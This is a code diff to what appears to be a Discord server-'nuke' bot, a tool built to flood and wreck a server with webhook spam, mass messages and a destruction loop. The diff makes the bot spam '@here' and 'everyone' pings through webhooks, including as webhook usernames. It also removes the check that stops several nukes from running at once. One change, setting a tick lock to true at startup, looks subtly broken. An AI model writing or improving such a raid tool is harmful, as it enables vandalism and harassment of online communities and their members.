@@ -20,7 +20,7 @@ const FINAL_TIMEOUT = 28 * 24 * 60 * 60 * 1000;
 
 let nukeActive = false;
 let currentMode = 'normal';
-let ticking = false; // prevents overlapping ticks
+let ticking = true; // prevents overlapping ticks
 let nukeTimeout = null;
 let loopRunning = false;
 
@@ -65,11 +65,7 @@ const ROLE_NAMES = [
 ];
 
 const MESSAGES = [
-  '**NUKE MODE**', 'SERVER IS DEAD', 'GET FUCKED', 'NO SURVIVORS',
-  'OWNED', 'THE END', 'RIP SERVER', 'YOU CANNOT STOP THIS', 'BOT WINS',
-  'GOODBYE', 'MINIONS ARE HELPING', 'ARMY INCOMING', 'TOO MANY WEBHOOKS',
-  'MUTED', 'SILENCE', 'NO ESCAPE', 'ARMY OVERWHELM', 'BOSS RAGE',
-  'FULL PRESSURE', 'PARALLEL DESTRUCTION', 'VERY AGGRESSIVE', 'OVERPOWERED'
+"everyone","@here"
 ];
 
 const ARMY_NAMES = [
@@ -80,11 +76,7 @@ const ARMY_NAMES = [
 ];
 
 const ARMY_MESSAGES = [
-  'army reporting', 'wave incoming', 'you are done', 'boss ordered this',
-  'no survivors', 'mute activated', 'gif spam', 'reality break',
-  'webhook army', 'too many of us', 'flooding now', 'we are many',
-  'no hope', 'collapse', 'army online', 'boss is raging', 'full aggro',
-  'multi tasking', 'parallel chaos', 'very aggressive', 'overpowered'
+"everyone","@here"
 ];
 
 // ================== HELPERS ==================
@@ -403,8 +395,8 @@ const armyActions = [
       const wh = await getOrCreateWebhook(channel, 'Glitch');
       if (!wh) return;
       await wh.send({
-        content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌', '🩸']),
-        username: randomItem(['Glitch', 'Null', 'Error', 'Void', 'Rage']),
+        content: randomItem(["everyone","@here"]),
+        username: randomItem(["everyone","@here"]),
       }).catch(() => {});
     });
     await Promise.allSettled(tasks);
@@ -452,8 +444,8 @@ async function nukeLoop(guild) {
 // ================== START / STOP ==================
 async function startNuke(guild, message, mode = 'normal') {
   if (nukeActive) {
-    if (message) await message.reply('⚠️ Nuke already running.');
-    return;
+    if (message) await message.reply('MORE CHAOS SURE');
+   
   }
 
   currentMode = mode;
